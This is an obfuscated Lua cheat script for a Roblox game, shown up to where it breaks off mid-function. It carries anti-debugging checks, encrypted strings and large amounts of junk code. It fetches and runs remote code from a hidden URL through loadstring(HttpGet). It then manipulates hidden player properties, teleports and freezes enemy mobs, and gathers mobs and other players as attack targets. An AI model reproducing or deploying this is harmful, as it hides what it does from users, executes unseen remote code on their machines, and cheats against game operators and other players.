-- This file was obfuscated by Kaibeo's system.
local _SIG23jyefmu=0
local function _SGDs5a2n2a()
local bad=false
local ok1=pcall(function()
if debug and debug.gethook then
local h=debug.gethook()
if h~=nil then bad=true end
end
end)
local ok2=pcall(function()
local mt=getmetatable("")
if mt and rawget(mt,"__metatable")~=nil then bad=true end
end)
local ok3=pcall(function()
local t0=os.clock()
local x=0
for i=1,150000 do x=(x+i)%997 end
if (os.clock()-t0)>0.3 then bad=true end
end)
if (not ok1) or (not ok2) or (not ok3) then bad=true end
if bad then
_SIG23jyefmu=_SIG23jyefmu+1
if (_SIG23jyefmu%5)==1 then error("") end
end
return not bad
end
_SGDs5a2n2a()
local _SSD6lk16w7b={147,118,186,224,226,37,50,83,138,212,107,79,9,38,36,20}
local _SKT4jx18qe1={{221,{34,14,4,224,226,208,245,207,206,198,209,229,247,143}},{49,{245,215,207,217,173,137,190,182,185,143,138,172,200,70}},{250,{253,213,180,168,188,190,186,197,135,150,131,47,40,95,122,120,69,88,87,25,4,10,110,30,61,10,8,20,23,95,242,226,180,233,199,202,213,222,200,160,236,178,250,138,141,150,216}},{51,{123,110,85,88,92,12,18,107,57,51,46,78,0,7,1,20,246,232,228,235,250,212,206,219,213,182,172,190,163,240,134,131,158,213,113,96,110,123,107,77,78,92,91,41,34,97,25,41,2,71,5,29,12,242,232,230,180,208,204,214,196,145,173,169,178,190,146,199,130,151,148,106,36,64,96,90,66,64,118,83,45,44,56,63,9,82,67,66,85,238,252,241}},{125,{13,19,3,39,30,240,255,249,244,251}},{246,{94,76,76,93,94,91,54}},{132,{}},{201,{79,74,71,68,84,94,50,36,59,53,48,8,20,30,11,246}},{145,{86,67,81,99,94,83,48,32,50,46,8,7,1,36,28,224,226,231,234}},{175,{193,248,248,246,248,240,200,216,212,161,160,164,174}},{161,{}},{86,{231,195,215,195,151,173,163,185,190,141,159,139}},{204,{151,174,138,132,150,174,154,106,98,119,114,86,80}},{136,{239,219,213,174,171,165,183,173}},{73,{50}},{158,{250,204,173,166,160,186,181,135,184,158,151,139,86,108,102,111}},{58,{}},{137,{183,115,96,117,117,77,64,84}},{87,{89,109,114,71,67,91,82,38,27,63,56,42,53,13,1,14}},{139,{52}},{213,{255,203,168,173,189,181,136,140}},{83,{48,10,235,236,250,244,203,205,226,216,209,177,156,178,168,149}},{220,{}},{38,{38}},{233,{44}},{12,{172,142,137,157,136,106,100,118}},{249,{51,4,0,18,243,247,239,246,249}},{174,{169,97,121,96,120,73,73}},{41,{98,86,51,51,11,51,58,6,9,5}},{224,{68,97,123,116,79,108,86,81,91,38,56}},{161,{135,160,166,168,164,142,137,147,158,112}},{246,{73,126,116,112,84,110,91,73,48,44,51,35,55,10,2,54,28,231,237,236,226}},{146,{118,89,93,104,32,49,60,19,59,2,14,17,13}},{225,{19,59,21,24,27,53,231,206,230,243,241,192,238,212,223,165,164,186}},{175,{}},{227,{129,171,162,189,143,135,159,128}},{50,{80,126,65,72,92}},{171,{132,178,166,145,153,129,159}},{57,{59,19,11,244,238,237,249,249,230,199,216,204,203,163,191}},{126,{133,170,190,143,129}},{70,{131,186,177,142,137}},{100,{126,86,52,40}},{86,{146,184,174,164,182,136,142,129}},{11,{54,209,201,1,17,93,239,227,102,185,195,198,215}},{129,{199,254,252,250,202}},{61,{43,31,28,25,17,233,228,240}},{249,{85,81,70,83,87,47,46,42,7,51,12,30,33,25,13,242}},{83,{37,15,6,25,211,235,227,236}},{234,{34}},{62,{241,200,161,168,160,178,149,128,149}},{12,{132,172,167,190,178,136,130,131}},{64,{127}},{138,{41,29,31,236,225,234,229}},{8,{110,92,90,48,40,51,35,59,23,31}},{145,{130,190,165,185,188,141,205,186,148,34,74,84}},{214,{118}},{158,{119}},{188,{195,242,234,209,197,221,221,225,143,186,184,253,169,142,134,145,111,99}},{174,{75,69,87,66,92,95,34,62,52,60,12,18,2,6,26,229,236}},{99,{241,214,174,179,188,186,176,143,143,131,139}},{217,{161,134,157,149,159,113,79,124,116,85,90,64,90,81,33,57}},{149,{207,163,171,188,178}},{86,{}},{171,{217,179,163,183,175,139,134,158}},{71,{188,148,134,140,130,148,107,101}},{150,{98,102,119,67,77,93}},{100,{112,80,65,81,95,51}},{152,{22,10,235,239,241,233}},{226,{162,190,188,186,148,142,129,155}},{96,{215,233,254,245,213,205,220}},{233,{77,67,69,89,83,95,49,35,33,104}},{51,{212,232,249,244,214,204,245,193,219,171,184}},{246,{223}},{25,{165,129,150,99,103,127,126,122}},{11,{63,19,247,255,243,247,195,194}},{187,{90,125,121,102,67,95}},{54,{118,40,62,32,58,12,10,21}},{237,{94,117,69,77,67}},{174,{}},{8,{94,66,89,84,104,94,52,57}},{159,{}},{238,{41,4,22,28,236}},{188,{41}},{240,{152,162,179,132,130,156,147,101}},{63,{126}},{184,{149,129,138,150}},{70,{48,10,235,236,250,244,203,205,226,216,209,177,156,178,168,149}},{139,{156,132,159,150,170,96,122,123}},{83,{159,133,152,151,169,97,117,122}},{113,{7,45,32,63,49,9,29,2}},{99,{154,186,179,143}},{24,{32,27,27}},{142,{200}},{74,{}},{11,{102,88,78,48,42,60,58,5}},{96,{54,26,241,236,192,246,236,209}},{247,{213}},{75,{146,163,186,186,177,196,172,135,144,116,102,124}},{25,{129,191,140,135,155,147,184,114,110,124,109}},{77,{121,117,107}},{151,{}},{21,{104,36,56,35,63,62,5,31,23,29,211,243,225,231,253,196,207}},{158,{157,184,186,144,128,150,137}},{227,{120,88,48}},{171,{103,121,108,25,57,55,48,18,42,1,21,199,255,245,249,234}},{201,{207,193,198,221,205,165,130,184,176,178,151}},{187,{98,95,85,92,45,39,35,35,49,23,1}},{112,{246,181,159,177,183,141,136,148,158,144,98,83,80,118,72,77,65,66}},{230,{163,153,158,101,103,65,113,79,83,93,121,89,37,62}},{162,{132,160,181,188,136,191,157,141,97,107,93,125,115,87,89}},{99,{203,225,246,253,207,254,222,204,222,170,158,188,180,150,154}},{184,{147}},{84,{175,139,148,152}},{163,{70}},{113,{116}},{165,{199,237,233,245,206,195,206}},{239,{146,185,177,136,130,154}},{109,{}},{246,{119}},{64,{219,255,192,204}},{8,{193,241,207,200,218,149,251,182,164,241,157,173,148,215}},{38,{187,101,98,122,101,105,77,69,85,25,1,41,39,56,61,23,3,30,22}},{24,{207,235,226,236,191,224,204,199,207,226,168,164,163,191,134,135}},{200,{71,114,68,85,86,72,50}},{67,{30,54,42,13,1,12,23,9,225,239,193,237,207,213,207,210,217}},{250,{119,72,92,94,79,51,43,50,61}},{187,{141,147,131,167,158,112,127,121,116,123}},{21,{108,94,82,83,44,41,32}},{172,{124,46,44,38,58,1,29,21,5,13}},{251,{35,61,80,212,232,243,242,209,221,213,197,255,177,184,178,185,138}},{201,{209,207,190,202,250,193,196,199,207,167,187,152,190,170}},{2,{189}},{76,{124,80,81,44,62,52,29,41,3,3,0}},{197,{163,149}},{83,{}},{152,{162,150}},{96,{184,148,149,144,114,104,81,109,71,71,68}},{126,{27,61}},{112,{146,134}},{37,{}},{155,{251}},{87,{}},{24,{116,38,43,53}},{109,{195,233,252,243,205,197,217,198}},{9,{}},{88,{134,160,177,130,132,158,145,155,84,98,123,111,114,72,66,67}},{38,{162,134,157,144,172,98,120,101}},{90,{}},{164,{196,236,231,254,242,200,194,195}},{34,{}},{171,{149,145,134,147,151,111,110,106,71,115,76,94,97,89,77,50}},{240,{11,63,60,57,49,9,4,16}},{184,{10,60,61,54,48,10,5,23,40,238,231,251,198,252,214,223}},{214,{231,222,220,218,170}},{200,{118,73,34,41,63,51,22,1,18}},{125,{}},{243,{163}},{175,{138}},{112,{}},{197,{141,143,136,130}},{97,{182,151,109,113,48,81,108,80,69,71}},{176,{106,72,82,79,1,37,57,52,53,55,9,30,21,245,237}},{126,{122,94,37,38,36,58,1,2}},{178,{}},{1,{183,133,158,148}},{122,{221,202,194,204,155,132,187,165,190,170}},{8,{118,36,46,59,21,49,13,8,25,43,229,234,225,225,249}},{77,{255}},{21,{211,195,203,192,248,174,160,179,188,140,128,129,156,142,100}},{51,{}},{37,{}},{213,{108,94,95,88,46,40,39,49,14,12,5,5,40,30,244,249}},{80,{6}},{12,{109}},{200,{164,134,151,96,102,96,127,121}},{34,{126,72,41,42,60,54,9,3,60,26,19,247,218,240,234,235}},{185,{1,60,62,4,4}},{13,{198,249,242,249,239,195,230,209,194}},{214,{254,226,243,199,201,193}},{15,{189,179,210,86,110,117,112,83,83,75,71,116,42,62}},{89,{21}},{210,{168}},{96,{205}},{165,{176,138,107,108,122,116,75,77,98,88,81,49,28,50,40,21}},{109,{191,139,104,109,125,117,72,76,125,89,82,48,27,51,43,20}},{139,{23,19,0,21,21,237,224,244}},{125,{173,156,149,156,116,110,89,124,89}},{50,{213,231,224,250}},{168,{246,205,209}},{100,{195,226,202,250,202,194,213,223,171,167,183,136,157,137,133,150,148,117}},{37,{5,63,52,63,9,63,27,21,245,251,195,243,251,208}},{122,{194,250,255,194,198,229,215,203,167,161,135,179,141,157,131}},{22,{229,223,212,223,169,152,188,174,128,132,188,158,146,112,120}},{101,{153,142,134,136,215,184,119,121,122,110}},{51,{161,145,157,118,74,124,126,125,78,126,86,87,46,60,42}},{103,{24}},{177,{204}},{47,{56,52,3,13,80,20,19,232}},{184,{130,133,140,143,117,55,59,52,64,72,94,86,80,36,97,59,47,3,70,23,15,7,171,231,253,248,196,194,220,154,222,162,164,176,182,190,200,129,129,154}}}
local function _SXRfut15g77(a,b) local r,p=0,1; while a>0 or b>0 do local ab=a%2; local bb=b%2; if ab~=bb then r=r+p end; a=(a-ab)/2; b=(b-bb)/2; p=p*2 end; return r end
local function _SDXf6js66qm(i) local e=_SKT4jx18qe1[i+1]; local k=e[1]; local b=e[2]; local sb=_SSD6lk16w7b[(i%#_SSD6lk16w7b)+1]; local r={}; for j=1,#b do local kk=(k+(j-1)*7+sb+_SIG23jyefmu)%256; r[j]=string.char(_SXRfut15g77(b[j],kk)) end; return table.concat(r) end
repeat task.wait() until game:IsLoaded() and game.Players.LocalPlayer
getgenv().RyzenConfigKey = _SDXf6js66qm(0)
local _O_0 = _SDXf6js66qm(1)
if getgenv().RyzenConfigKey ~= _O_0 then local _q12=(function() local _r=0; local _i=1; while _i<=3 do _r=_r+(_i*_i); _i=_i+1 end; return _r end)(); local _t14=(56<90) and (90-56) or (56-90);
warn(_SDXf6js66qm(2))
return
end local _q96=(function() local _r=0; local _i=1; while _i<=2 do _r=_r+(_i*_i); _i=_i+1 end; return _r end)();
loadstring(game:HttpGet(_SDXf6js66qm(3)))()
getgenv().BringMob = true
getgenv().BringDistance = 500
getgenv().SafeDistance = 22
getgenv().LockMobName = true
task.spawn(function()
local _o_1 = game:GetService(_SDXf6js66qm(4))
local _0x2 = game.Players.LocalPlayer
local _l_3 = workspace:WaitForChild(_SDXf6js66qm(5))
task.spawn(function()
while task.wait(0.5) do do if (64*76)%((64+76)==0 and 1 or (64+76))==(64*76)%((64+76)==0 and 1 or (64+76)) then local _z6476=1 end local _s21=_SDXf6js66qm(6) for _i=1,0 do _s21=_s21.._i end local _w92=(function() local _acc=92; local _t={34,70,92}; for _i=1,#_t do _acc=(_acc+_t[_i])%2311 end; return _acc end)(); end
if getgenv().BringMob then if (78*32)%((78+32)==0 and 1 or (78+32))==(78*32)%((78+32)==0 and 1 or (78+32)) then local _z7832=1 end
pcall(function()
if sethiddenproperty then local _j37=(function() local _x=37; local _w33=(function() local _acc=33; local _t={92,13,33}; for _i=1,#_t do _acc=(_acc+_t[_i])%2311 end; return _acc end)(); local _y=48; if (_x*_x-_y*_y)==((_x-_y)*(_x+_y)) then local _f33=(function(_p) local _s=0; for _i=1,4 do _s=_s+_i end; if _s==_p then return _s end; return _s end)(10); _x=_x+1 else _x=_x-1 end; if (67*14)%((67+14)==0 and 1 or (67+14))==(67*14)%((67+14)==0 and 1 or (67+14)) then local _z6714=1 end return _x end)(); do local _p23={}; for _i=1,4 do _p23[_i]=_i*48 end; local _sum23=0; for _i=1,#_p23 do _sum23=_sum23+_p23[_i] end end _SGDs5a2n2a()
sethiddenproperty(_0x2, _SDXf6js66qm(7), math.huge)
sethiddenproperty(_0x2, _SDXf6js66qm(8), math.huge)
end
end local _w119=(function() local _acc=119; local _t={91,34,119}; for _i=1,#_t do _acc=(_acc+_t[_i])%2311 end; return _acc end)(); local _n29=(29%2==0) and 88 or 29; )
end local _q63=(function() local _r=0; local _i=1; while _i<=4 do _r=_r+(_i*_i); _i=_i+1 end; return _r end)();
end local _t10=(10<49) and (49-10) or (10-49); local _f86=(function(_p) local _s=0; for _i=1,2 do _s=_s+_i end; if _s==_p then return _s end; return _s end)(3);
end)
local function __4(_0x5, _0x6)
if not _0x5:FindFirstChild(_SDXf6js66qm(9)) then if (51*17)%((51+17)==0 and 1 or (51+17))==(51*17)%((51+17)==0 and 1 or (51+17)) then local _z5117=1 end do local _s34=_SDXf6js66qm(10) for _i=1,0 do local _q7=(function() local _r=0; local _i=1; while _i<=3 do _r=_r+(_i*_i); _i=_i+1 end; return _r end)(); _s34=_s34.._i end end if (73*87)%((73+87)==0 and 1 or (73+87))==(73*87)%((73+87)==0 and 1 or (73+87)) then local _z7387=1 end _SGDs5a2n2a()
local _lo_7 = Instance.new(_SDXf6js66qm(11))
_lo_7.Name = _SDXf6js66qm(12)
_lo_7.Velocity = Vector3.zero
_lo_7.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
_lo_7.Parent = _0x5
end
_0x5.AssemblyLinearVelocity = Vector3.zero
_0x5.AssemblyAngularVelocity = Vector3.zero
_0x5.CanCollide = false
_0x6.WalkSpeed = 0
_0x6.JumpPower = 0
_0x6.AutoRotate = false
if _0x6:FindFirstChild(_SDXf6js66qm(13)) then local _f12=(function(_p) local _s=0; for _i=1,3 do _s=_s+_i end; if _s==_p then return _s end; return _s end)(6); local _m9889=({98,89,51})[1]+0;
_0x6.Animator:Destroy()
end local _w168=(function() local _acc=168; local _t={89,81,168}; for _i=1,#_t do _acc=(_acc+_t[_i])%2311 end; return _acc end)();
_0x6:ChangeState(11)
end local _t54=(57<37) and (37-57) or (57-37); local _q37=(function() local _r=0; local _i=1; while _i<=3 do _r=_r+(_i*_i); _i=_i+1 end; return _r end)();
_o_1.Heartbeat:Connect(function()
if not getgenv().BringMob then return end if (75*65)%((75+65)==0 and 1 or (75+65))==(75*65)%((75+65)==0 and 1 or (75+65)) then local _z7565=1 end do local _k86=35+86; local _f96=(function(_p) local _s=0; for _i=1,2 do _s=_s+_i end; if _s==_p then return _s end; return _s end)(3); if _k86>1000000 then error(_SDXf6js66qm(14)) end local _f10=(function(_p) local _s=0; for _i=1,1 do _s=_s+_i end; if _s==_p then return _s end; return _s end)(1); end _SGDs5a2n2a()
pcall(function()
local _0x8 = _0x2.Character
local __9 = _0x8 and _0x8:FindFirstChild(_SDXf6js66qm(15))
if not __9 then if (73*57)%((73+57)==0 and 1 or (73+57))==(73*57)%((73+57)==0 and 1 or (73+57)) then local _z7357=1 end return end do local _f20=(function(_p) local _s=0; for _i=1,1 do _s=_s+_i end; if _s==_p then return _s end; return _s end)(1); local _s49=_SDXf6js66qm(16) for _i=1,0 do _s49=_s49.._i end do local _p29={}; for _i=1,2 do _p29[_i]=_i*68 end; local _sum29=0; for _i=1,#_p29 do _sum29=_sum29+_p29[_i] end end end
local _II_a = getgenv().BringDistance or 500
local _lI_b = getgenv().SafeDistance or 22
local _Ol_c = nil
local __d = _II_a
for _0xe, _0xf in ipairs(_l_3:GetChildren()) do local _f82=(function(_p) local _s=0; for _i=1,3 do _s=_s+_i end; if _s==_p then return _s end; return _s end)(6);
local __g = _0xf:FindFirstChildOfClass(_SDXf6js66qm(17))
local _oOo_h = _0xf:FindFirstChild(_SDXf6js66qm(18))
if __g and _oOo_h and __g.Health > 0 then local _t53=(74<52) and (52-74) or (74-52); do local _p16={}; for _i=1,1 do _p16[_i]=_i*53 end; local _sum16=0; for _i=1,#_p16 do _sum16=_sum16+_p16[_i] end end
local __i = (_oOo_h.Position - __9.Position).Magnitude
if __i < __d then
__d = __i
_Ol_c = _0xf
end do local _p58={}; for _i=1,3 do _p58[_i]=_i*14 end; local _sum58=0; for _i=1,#_p58 do _sum58=_sum58+_p58[_i] end end local _n98=(98%2==0) and 74 or 98; _SGDs5a2n2a()
end if (93*49)%((93+49)==0 and 1 or (93+49))==(93*49)%((93+49)==0 and 1 or (93+49)) then local _z9349=1 end
end local _m9273=({92,73,40})[1]+0; local _q85=(function() local _r=0; local _i=1; while _i<=1 do _r=_r+(_i*_i); _i=_i+1 end; return _r end)();
if not _Ol_c then return end local _q30=(function() local _r=0; local _i=1; while _i<=1 do _r=_r+(_i*_i); _i=_i+1 end; return _r end)(); do local _k83=82+83; do local _p37={}; for _i=1,2 do _p37[_i]=_i*90 end; local _sum37=0; for _i=1,#_p37 do _sum37=_sum37+_p37[_i] end end if _k83>1000000 then error(_SDXf6js66qm(19)) end local _q58=(function() local _r=0; local _i=1; while _i<=4 do _r=_r+(_i*_i); _i=_i+1 end; return _r end)(); end
local _lOo_j = _Ol_c.Name
local _0x14 = _Ol_c.HumanoidRootPart.Position
local _ooo_l = Vector3.new(__9.Position.X, _0x14.Y, __9.Position.Z)
local _Ioo_m = _0x14 - _ooo_l
local _0x17 = _Ioo_m.Magnitude
if _0x17 < _lI_b then local _w167=(function() local _acc=167; local _t={47,33,167}; for _i=1,#_t do _acc=(_acc+_t[_i])%2311 end; return _acc end)();
local _OIo_o = _0x17 > 0.1 and _Ioo_m.Unit or __9.CFrame.LookVector
_0x14 = _ooo_l + (_OIo_o * _lI_b)
end local _m7510=({75,10,22})[1]+0; local _q4=(function() local _r=0; local _i=1; while _i<=5 do _r=_r+(_i*_i); _i=_i+1 end; return _r end)(); _SGDs5a2n2a()
local _oIo_p = CFrame.new(_0x14)
for _0x1a, _0x1b in ipairs(_l_3:GetChildren()) do
if not getgenv().LockMobName or _0x1b.Name == _lOo_j then local _q88=(function() local _r=0; local _i=1; while _i<=4 do _r=_r+(_i*_i); _i=_i+1 end; return _r end)(); local _t32=(45<74) and (74-45) or (45-74);
local __s = _0x1b:FindFirstChildOfClass(_SDXf6js66qm(20))
local __t = _0x1b:FindFirstChild(_SDXf6js66qm(21))
if __s and __t and __s.Health > 0 then local _w23=(function() local _acc=23; local _t={49,85,23}; for _i=1,#_t do _acc=(_acc+_t[_i])%2311 end; return _acc end)();
local _0x1e = (__t.Position - _0x14).Magnitude
if _0x1e <= _II_a then do local _w187=(function() local _acc=187; local _t={89,77,187}; for _i=1,#_t do _acc=(_acc+_t[_i])%2311 end; return _acc end)(); local _s56=_SDXf6js66qm(22) for _i=1,0 do _s56=_s56.._i end local _q49=(function() local _r=0; local _i=1; while _i<=5 do _r=_r+(_i*_i); _i=_i+1 end; return _r end)(); end
__t.CFrame = _oIo_p
__4(__t, __s)
end local _f75=(function(_p) local _s=0; for _i=1,1 do _s=_s+_i end; if _s==_p then return _s end; return _s end)(1);
end do local _f76=(function(_p) local _s=0; for _i=1,2 do _s=_s+_i end; if _s==_p then return _s end; return _s end)(3); local _k19=50+19; if _k19>1000000 then local _q20=(function() local _r=0; local _i=1; while _i<=1 do _r=_r+(_i*_i); _i=_i+1 end; return _r end)(); error(_SDXf6js66qm(23)) end end do local _p90={}; for _i=1,3 do _p90[_i]=_i*64 end; local _sum90=0; for _i=1,#_p90 do _sum90=_sum90+_p90[_i] end end _SGDs5a2n2a()
end
end local _q3=(function() local _r=0; local _i=1; while _i<=4 do _r=_r+(_i*_i); _i=_i+1 end; return _r end)(); do local _k76=21+76; local _q83=(function() local _r=0; local _i=1; while _i<=4 do _r=_r+(_i*_i); _i=_i+1 end; return _r end)(); if _k76>1000000 then error(_SDXf6js66qm(24)) end local _w36=(function() local _acc=36; local _t={20,37,36}; for _i=1,#_t do _acc=(_acc+_t[_i])%2311 end; return _acc end)(); end
end if (59*16)%((59+16)==0 and 1 or (59+16))==(59*16)%((59+16)==0 and 1 or (59+16)) then local _z5916=1 end )
end local _m458=({45,8,9})[1]+0; do local _p23={}; for _i=1,4 do _p23[_i]=_i*93 end; local _sum23=0; for _i=1,#_p23 do _sum23=_sum23+_p23[_i] end end )
end)
local _0x1f = game:GetService(_SDXf6js66qm(25))
local _OOI_w = game:GetService(_SDXf6js66qm(26))
local __x = _OOI_w:WaitForChild(_SDXf6js66qm(27))
local function _IOI_y()
_0x1f.GlobalShadows = false
_0x1f.FogEnd = 9e9
_0x1f.ShadowSoftness = 0
for _0x23, __1_0 in ipairs(_0x1f:GetChildren()) do local _w88=(function() local _acc=88; local _t={5,70,88}; for _i=1,#_t do _acc=(_acc+_t[_i])%2311 end; return _acc end)(); local _m6865=({68,65,7})[1]+0; _SGDs5a2n2a()
if __1_0:IsA(_SDXf6js66qm(28)) or __1_0:IsA(_SDXf6js66qm(29)) or __1_0:IsA(_SDXf6js66qm(30))
or __1_0:IsA(_SDXf6js66qm(31)) or __1_0:IsA(_SDXf6js66qm(32))
or __1_0:IsA(_SDXf6js66qm(33)) then local _q75=(function() local _r=0; local _i=1; while _i<=1 do _r=_r+(_i*_i); _i=_i+1 end; return _r end)();
__1_0.Enabled = false
end local _j33=(function() local _x=33; local _q34=(function() local _r=0; local _i=1; while _i<=5 do _r=_r+(_i*_i); _i=_i+1 end; return _r end)(); local _y=87; if (_x*_x-_y*_y)==((_x-_y)*(_x+_y)) then if (77*34)%((77+34)==0 and 1 or (77+34))==(77*34)%((77+34)==0 and 1 or (77+34)) then local _z7734=1 end _x=_x+1 else _x=_x-1 end; local _f15=(function(_p) local _s=0; for _i=1,1 do _s=_s+_i end; if _s==_p then return _s end; return _s end)(1); return _x end)(); local _q40=(function() local _r=0; local _i=1; while _i<=1 do _r=_r+(_i*_i); _i=_i+1 end; return _r end)();
end
__x.WaterWaveSize = 0
__x.WaterWaveSpeed = 0
__x.WaterReflectance = 0
__x.WaterTransparency = 0
for __1_1, _0x26 in ipairs(_OOI_w:GetDescendants()) do local _q20=(function() local _r=0; local _i=1; while _i<=1 do _r=_r+(_i*_i); _i=_i+1 end; return _r end)(); do local _s50=_SDXf6js66qm(34) for _i=1,0 do do local _p31={}; for _i=1,4 do _p31[_i]=_i*18 end; local _sum31=0; for _i=1,#_p31 do _sum31=_sum31+_p31[_i] end end _s50=_s50.._i end end local _q94=(function() local _r=0; local _i=1; while _i<=5 do _r=_r+(_i*_i); _i=_i+1 end; return _r end)();
if _0x26:IsA(_SDXf6js66qm(35)) then
_0x26.CastShadow = false
_0x26.Material = Enum.Material.SmoothPlastic
_0x26.Reflectance = 0
elseif _0x26:IsA(_SDXf6js66qm(36)) or _0x26:IsA(_SDXf6js66qm(37)) then local _f84=(function(_p) local _s=0; for _i=1,5 do _s=_s+_i end; if _s==_p then return _s end; return _s end)(15); local _n19=(19%2==0) and 25 or 19; _SGDs5a2n2a()
_0x26.Transparency = 1
elseif _0x26:IsA(_SDXf6js66qm(38)) or _0x26:IsA(_SDXf6js66qm(39)) or _0x26:IsA(_SDXf6js66qm(40)) or _0x26:IsA(_SDXf6js66qm(41)) or _0x26:IsA(_SDXf6js66qm(42)) then local _w41=(function() local _acc=41; local _t={40,9,41}; for _i=1,#_t do _acc=(_acc+_t[_i])%2311 end; return _acc end)();
_0x26.Enabled = false
end local _m495=({49,5,13})[1]+0; local _q94=(function() local _r=0; local _i=1; while _i<=5 do _r=_r+(_i*_i); _i=_i+1 end; return _r end)();
end
end local _f13=(function(_p) local _s=0; for _i=1,4 do _s=_s+_i end; if _s==_p then return _s end; return _s end)(10); local _m4165=({41,65,19})[1]+0;
_IOI_y()
print(_SDXf6js66qm(43))
getHits = function(_loI_13, _0x28)
local _oII_15 = {}
local _0x2a = tonumber(_loI_13)
if not _0x2a or _0x2a <= 0 then local _q87=(function() local _r=0; local _i=1; while _i<=3 do _r=_r+(_i*_i); _i=_i+1 end; return _r end)();
return _oII_15
end local _t49=(34<68) and (68-34) or (34-68); local _f20=(function(_p) local _s=0; for _i=1,1 do _s=_s+_i end; if _s==_p then return _s end; return _s end)(1); _SGDs5a2n2a()
local _0x2b = getgenv().Setting and getgenv().Setting.FastAttack
if not _0x2b then
return _oII_15
end local _f71=(function(_p) local _s=0; for _i=1,2 do _s=_s+_i end; if _s==_p then return _s end; return _s end)(3); local _n6=(6%2==0) and 25 or 6;
local _OlI_18 = localPlayer and localPlayer.Character
local _olI_19 = _OlI_18 and getRootPart(_OlI_18)
if not _olI_19 then if (26*20)%((26+20)==0 and 1 or (26+20))==(26*20)%((26+20)==0 and 1 or (26+20)) then local _z2620=1 end
return _oII_15
end local _t34=(13<38) and (38-13) or (13-38); do local _p62={}; for _i=1,3 do _p62[_i]=_i*16 end; local _sum62=0; for _i=1,#_p62 do _sum62=_sum62+_p62[_i] end end
local _0x2e = {}
local function _llI_1b(_OOl_1c, _oOl_1d)
if not _OOl_1c or not _oOl_1d then
return
end local _f77=(function(_p) local _s=0; for _i=1,3 do _s=_s+_i end; if _s==_p then return _s end; return _s end)(6); local _n12=(12%2==0) and 25 or 12; _SGDs5a2n2a()
for _IOl_1e, _0x33 in ipairs(_OOl_1c:GetChildren()) do local _w114=(function() local _acc=114; local _t={96,46,114}; for _i=1,#_t do _acc=(_acc+_t[_i])%2311 end; return _acc end)();
if _0x33:IsA(_SDXf6js66qm(44)) and _0x33 ~= _OlI_18 then local _t24=(59<81) and (81-59) or (59-81); local _q15=(function() local _r=0; local _i=1; while _i<=1 do _r=_r+(_i*_i); _i=_i+1 end; return _r end)();
local __1_g = _0x33:FindFirstChildOfClass(_SDXf6js66qm(45))
local __1_h = _0x33:FindFirstChild(_SDXf6js66qm(46))
local _0x36 = _0x28 and _0x33:FindFirstChild(_0x28) or __1_h
if not _0x36 or not _0x36:IsA(_SDXf6js66qm(47)) then
_0x36 = __1_h
end if (93*18)%((93+18)==0 and 1 or (93+18))==(93*18)%((93+18)==0 and 1 or (93+18)) then local _z9318=1 end do local _k90=68+90; local _w174=(function() local _acc=174; local _t={61,31,174}; for _i=1,#_t do _acc=(_acc+_t[_i])%2311 end; return _acc end)(); if _k90>1000000 then error(_SDXf6js66qm(48)) end do local _p53={}; for _i=1,2 do _p53[_i]=_i*95 end; local _sum53=0; for _i=1,#_p53 do _sum53=_sum53+_p53[_i] end end end
local __1_j = _0x33:GetAttribute(_SDXf6js66qm(49))
if
__1_g
and __1_g.Health > 0
and __1_h
and _0x36
and _0x36:IsA(_SDXf6js66qm(50))
and (not __1_j or getgenv().DoingEscapeQuest)
and (__1_h.Position - _olI_19.Position).Magnitude < _0x2a
and not _0x2e[_0x36]
then local _w170=(function() local _acc=170; local _t={92,60,170}; for _i=1,#_t do _acc=(_acc+_t[_i])%2311 end; return _acc end)();
_0x2e[_0x36] = true
_oII_15[#_oII_15 + 1] = _0x36
end local _j10=(function() local _x=10; local _f94=(function(_p) local _s=0; for _i=1,5 do _s=_s+_i end; if _s==_p then return _s end; return _s end)(15); local _y=79; if (_x*_x-_y*_y)==((_x-_y)*(_x+_y)) then do local _p19={}; for _i=1,4 do _p19[_i]=_i*39 end; local _sum19=0; for _i=1,#_p19 do _sum19=_sum19+_p19[_i] end end _x=_x+1 else _x=_x-1 end; if (25*60)%((25+60)==0 and 1 or (25+60))==(25*60)%((25+60)==0 and 1 or (25+60)) then local _z2560=1 end return _x end)(); local _f43=(function(_p) local _s=0; for _i=1,4 do _s=_s+_i end; if _s==_p then return _s end; return _s end)(10); _SGDs5a2n2a()
end
end local _q67=(function() local _r=0; local _i=1; while _i<=3 do _r=_r+(_i*_i); _i=_i+1 end; return _r end)(); do local _k63=69+63; if (69*53)%((69+53)==0 and 1 or (69+53))==(69*53)%((69+53)==0 and 1 or (69+53)) then local _z6953=1 end if _k63>1000000 then error(_SDXf6js66qm(51)) end local _w208=(function() local _acc=208; local _t={75,89,208}; for _i=1,#_t do _acc=(_acc+_t[_i])%2311 end; return _acc end)(); end
end local _q44=(function() local _r=0; local _i=1; while _i<=5 do _r=_r+(_i*_i); _i=_i+1 end; return _r end)();
_llI_1b(workspace:FindFirstChild(_SDXf6js66qm(52)), _0x2b.OnMob == true)
_llI_1b(workspace:FindFirstChild(_SDXf6js66qm(53)), _0x2b.OnPlayer == true)
return _oII_15
end local _n52=(52%2==0) and 32 or 52; if (29*49)%((29+49)==0 and 1 or (29+49))==(29*49)%((29+49)==0 and 1 or (29+49)) then local _z2949=1 end
Delay = 0
LastHash = tick()
print(_SDXf6js66qm(54))
AttackNoCD = function() end
getNearestPlayer = function()
local _0x38 = 9999999
local __1_l = nil
for _IIl_1m, __1_n in pairs(getOtherPlayers()) do do local _p5={}; for _i=1,2 do _p5[_i]=_i*83 end; local _sum5=0; for _i=1,#_p5 do _sum5=_sum5+_p5[_i] end end do local _k20=70+20; local _w94=(function() local _acc=94; local _t={30,45,94}; for _i=1,#_t do _acc=(_acc+_t[_i])%2311 end; return _acc end)(); if _k20>1000000 then error(_SDXf6js66qm(55)) end local _q62=(function() local _r=0; local _i=1; while _i<=3 do _r=_r+(_i*_i); _i=_i+1 end; return _r end)(); end _SGDs5a2n2a()
if __1_n ~= localPlayer then do local _p49={}; for _i=1,2 do _p49[_i]=_i*40 end; local _sum49=0; for _i=1,#_p49 do _sum49=_sum49+_p49[_i] end end
if Alive() and isCharacterAlive(__1_n.Character) then local _n77=(77%2==0) and 31 or 77; local _w9=(function() local _acc=9; local _t={82,58,9}; for _i=1,#_t do _acc=(_acc+_t[_i])%2311 end; return _acc end)();
if getDistance(__1_n.Character, localPlayer.Character) <= _0x38 then
_0x38 = getDistance(__1_n.Character, localPlayer.Character)
__1_l = __1_n
